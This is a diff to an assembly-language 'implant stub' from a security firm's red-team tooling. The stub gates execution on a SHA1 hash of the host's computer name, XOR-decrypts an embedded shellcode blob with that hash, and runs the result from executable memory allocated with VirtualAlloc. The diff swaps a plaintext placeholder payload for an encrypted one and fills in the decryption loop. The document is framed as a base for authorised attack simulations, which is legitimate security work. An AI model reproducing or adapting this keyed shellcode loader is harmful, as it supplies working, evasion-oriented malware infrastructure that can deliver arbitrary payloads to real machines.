@@ -1,7 +1,8 @@
 ; -----------------------------------------------------------------------------
 ; 
 ;  Implant Stub Code - MASM EXE
-;  (C) Stuart Morgan (@ukstufus) <stuart.morgan@mwrinfosecurity.com>
+;  (C) 2016 Stuart Morgan (@ukstufus) <stuart.morgan@mwrinfosecurity.com>
+;  MWR InfoSecurity Ltd, MWR Labs
 ;
 ;  This code is designed to act as a basis for safer implants during simulated
 ;  attacks. 
@@ -39,41 +40,44 @@ GenerateHash PROTO :DWORD,:DWORD
 
 .data         
                      
-; The mutex name. "Local\" means per session. "Global\" means per system. Change it to whatever you want.
-strMutexName  db  "Global\Stufus",0    
-
-; The hash of the authorised NetBIOS computer name
-hashSHA1CompterName db 53h,8Fh,68h,0F9h,2Ch,0A3h,76h,0E5h,23h,0E6h,0D6h,0A9h,68h,63h,0DEh,02h,7Dh,76h,0A3h,0DAh
-
 ; Had to work this out from msdn.microsoft.com/en-us/library/windows/desktop/ms724224%28v=vs.85%29.aspx
-; and some experimentation
+; and some experimentation. You shouldn't need to change this.
 CNF_ComputerNamePhysicalNetBIOS           equ 4
 CNF_ComputerNamePhysicalDnsHostname       equ 5
 CNF_ComputerNamePhysicalDnsDomain         equ 6
 CNF_ComputerNamePhysicalDnsFullyQualified equ 7
 
 ; From https://msdn.microsoft.com/en-us/library/windows/desktop/aa375549%28v=vs.85%29.aspx
+; It identifies the constant needed to request a SHA1 hash from the Crypto API
 MS_CALG_SHA1 equ 8004h    
 MS_CALG_SHA1_HASHSIZE equ 20 ; The actual size of a returned SHA1 hash (20/0x14 bytes)
 
+; The mutex name. "Local\" means per session. "Global\" means per system. Change it to whatever you want.
+strMutexName  db  "Global\Stufus",0    
+
+; The hash of the authorised NetBIOS computer name. Change this to the real hash.
+; You can generate this with raw2src.py or manually if you prefer
+hashSHA1CompterName db 53h,8Fh,68h,0F9h,2Ch,0A3h,76h,0E5h,23h,0E6h,0D6h,0A9h,68h,63h,0DEh,02h,7Dh,76h,0A3h,0DAh
+
 ; Replace this with the actual shellcode to run (e.g. from metasploit or cobalt strike etc)
-SHELLCODELEN equ 303
-shellcode db 217,235,155,217,116,36,244,49,210,178,119,49,201,100,139,113,48,139,118,12
-          db 139,118,28,139,70,8,139,126,32,139,54,56,79,24,117,243,89,1,209,255
-          db 225,96,139,108,36,36,139,69,60,139,84,40,120,1,234,139,74,24,139,90
-          db 32,1,235,227,52,73,139,52,139,1,238,49,255,49,192,252,172,132,192,116
-          db 7,193,207,13,1,199,235,244,59,124,36,40,117,225,139,90,36,1,235,102
-          db 139,12,75,139,90,28,1,235,139,4,139,1,232,137,68,36,28,97,195,178
-          db 8,41,212,137,229,137,194,104,142,78,14,236,82,232,159,255,255,255,137,69
-          db 4,187,126,216,226,115,135,28,36,82,232,142,255,255,255,137,69,8,104,108
-          db 108,32,65,104,51,50,46,100,104,117,115,101,114,48,219,136,92,36,10,137
-          db 230,86,255,85,4,137,194,80,187,168,162,77,188,135,28,36,82,232,95,255
-          db 255,255,104,115,88,32,32,104,32,76,97,98,104,32,77,87,82,104,117,115
-          db 32,47,104,83,116,117,102,49,219,136,92,36,17,137,227,104,88,32,32,32
-          db 104,32,110,111,119,104,110,105,110,103,104,32,114,117,110,104,100,32,98,101
-          db 104,119,111,117,108,104,97,110,116,32,104,105,109,112,108,104,84,104,101,32
-          db 49,201,136,76,36,32,137,225,49,210,106,64,83,81,82,255,208,49,192,80
-          db 255,85,8
+; You can generate this with raw2src.py or manually if you prefer
+shellcode db 147,165,198,182,210,135,155,91,24,126,158,229,50,116,166,138,30,246,101,35
+          db 193,56,65,228,224,171,228,20,234,71,223,236,180,8,88,8,119,124,194,208
+          db 171,46,214,3,130,135,228,47,246,71,189,252,131,17,199,112,100,101,152,117
+          db 106,79,182,140,146,234,228,94,65,205,7,229,4,33,237,7,130,249,211,91
+          db 77,143,146,98,167,100,132,158,241,176,205,252,142,241,166,161,10,124,248,73
+          db 193,66,22,228,252,191,110,129,65,200,98,213,19,153,105,223,50,28,208,157
+          db 66,103,137,230,67,42,173,2,68,130,231,56,169,248,178,4,209,130,154,106
+          db 78,245,35,183,68,208,232,118,238,158,1,90,4,239,210,114,107,117,123,67
+          db 38,110,28,7,149,145,65,14,162,185,154,177,137,32,246,115,114,89,25,166
+          db 172,24,162,58,162,42,173,58,113,100,75,153,71,151,49,223,124,149,76,208
+          db 181,177,53,28,254,131,79,2,234,128,136,182,147,48,96,172,124,21,102,92
+          db 106,97,53,60,210,214,9,91,17,68,181,240,234,153,206,147,118,93,51,15
+          db 34,110,51,0,209,203,1,3,164,171,129,244,137,101,67,147,74,93,113,74
+          db 34,57,50,26,202,203,14,4,190,236,129,189,150,96,65,147,122,21,118,15
+          db 123,135,213,35,130,131,230,139,251,30,131,148,168,65,127,4,254,76,211,127
+          db 181,27,85
+shellcodelen  equ  303
 
 .data?
             
@@ -154,12 +158,38 @@ CheckExecution PROC uses esi edi
 
  ; Now loop through the shellcode xoring it with the hash values (repeating hash
  ; values if necessary)
- ; ecx = The loop counter
+ ; ecx = The loop counter (i.e. position in the shellcode)
+ ; edi = Pointer to the hash
+ ; eax = The position in the hash
+ ; esi = Pointer to the shellcode
+ ; edx = 'Working' register (to store the current character)
+ mov ecx, 0
+ mov eax, 0
+ mov esi, offset shellcode
+ xor edx, edx
+
+startloop:
+ mov dh, byte ptr [esi+ecx]
+ xor dh, byte ptr [edi+eax]
+ mov byte ptr [esi+ecx], dh 
+ .if eax==MS_CALG_SHA1_HASHSIZE-1      ; If we are at the end of the hash, start again
+    xor eax, eax
+ .else
+    inc eax
+ .endif
+ .if ecx<shellcodelen                ; If we are at the end of the shellcode, its done
+    inc ecx
+    jmp startloop                    ; If not, increase the counter by one and start again
+ .endif
+ invoke GlobalFree, edi              ; Free the hash buffer
 
 
- invoke GlobalFree, edi ; Free the hash buffer
+ ; ============================================================================
+ ; 
+ ; Finally execute the shellcode
+ ;
+ ; ============================================================================
 
- ; Now run the shellcode
  invoke ExecuteShellcode
 
 ; If the hash was incorrect, jump here because we
@@ -281,12 +311,12 @@ GenerateHash ENDP
 
 ExecuteShellcode PROC uses esi edi
   ; Allocate the memory for the shellcode
-  invoke VirtualAlloc, NULL, SHELLCODELEN, MEM_COMMIT, PAGE_EXECUTE_READWRITE
+  invoke VirtualAlloc, NULL, shellcodelen, MEM_COMMIT, PAGE_EXECUTE_READWRITE
   .if eax!=0
     mov edi, eax
     push eax
     mov esi, offset shellcode
-    mov ecx, SHELLCODELEN
+    mov ecx, shellcodelen
     cld
     rep movsb
     pop edx
